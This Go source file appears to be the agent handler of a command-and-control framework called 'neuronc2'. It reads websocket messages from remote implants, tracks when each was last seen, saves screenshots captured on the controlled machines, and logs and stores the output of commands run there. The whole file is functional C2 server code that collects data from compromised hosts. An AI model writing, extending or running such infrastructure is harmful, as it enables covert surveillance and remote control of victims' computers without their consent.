package agent

import (
	"encoding/json"
	"log"
	"neuronc2/internal/database"
	"neuronc2/internal/utils"
	"neuronc2/pkg/models"
	"strings"
	"time"
)

type Handler struct {
	queries *database.Queries
}

func NewHandler(queries *database.Queries) *Handler {
	return &Handler{
		queries: queries,
	}
}

func (h *Handler) HandleConnection(agent *Agent, record database.AgentRecord) {
	for {
		_, message, err := agent.Conn.ReadMessage()
		if err != nil {
			break
		}

		agent.LastSeen = time.Now()
		h.queries.UpdateAgentLastSeen(record.AgentID)

		var resp models.AgentResponse
		if err := json.Unmarshal(message, &resp); err == nil {
			h.processResponse(agent, record, resp)
		} else {
			agent.Response <- string(message)
			log.Printf("Raw response from %s: %s\n", record.AgentID, string(message))
		}
	}
}

func (h *Handler) processResponse(agent *Agent, record database.AgentRecord, resp models.AgentResponse) {
	if strings.HasPrefix(resp.Output, "data:image/png;base64,") {
		base64data := strings.TrimPrefix(resp.Output, "data:image/png;base64,")
		if err := utils.SaveScreenshot(resp.AgentID, base64data); err != nil {
			log.Printf("[!] Failed to save screenshot: %v", err)
		} else {
			log.Printf("[+] Screenshot from %s saved\n", resp.AgentID)
		}
		agent.Response <- "Screenshot received and saved."
	} else {
		agent.Response <- resp.Output
		log.Printf("Response from %s: %s\n", record.AgentID, utils.Truncate(resp.Output, 100))

		// Save to command history
		if len(resp.Output) > 0 {
			h.queries.SaveCommandHistory(record.AgentID, "", resp.Output)
		}
	}
}
